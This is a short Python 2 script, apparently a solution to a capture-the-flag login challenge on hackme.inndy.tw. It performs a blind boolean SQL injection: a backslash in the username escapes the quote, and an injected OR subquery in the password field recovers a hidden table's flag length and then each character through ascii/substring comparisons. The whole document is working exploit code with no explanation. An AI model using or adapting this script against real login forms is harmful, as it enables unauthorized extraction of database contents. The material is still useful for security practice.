import requests, string


s = requests.session()
url = 'https://hackme.inndy.tw/login0/'
length = 0
chars = string.printable
database = ''
flag = ''
for i in xrange(100):
    payload = "||(select length(the_f14g) from h1dden_f14g limit 0,1) = %s -- -" %i
    data = {'name': "admin\\",'password': payload}
    r = s.post(url, data=data)
    if "You are not admin!" in r.text:
        length = i
        print "flag length is %s"%i
        break
flag = ''
for i in range(1, length+1):
    for j in chars:
        payload = "||(select ascii(substring(the_f14g, %s, 1)) from h1dden_f14g limit 0,1) = %s -- -" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        if "You are not admin!" in r.text:
            flag += j
            print "flag is %s" % flag
            break


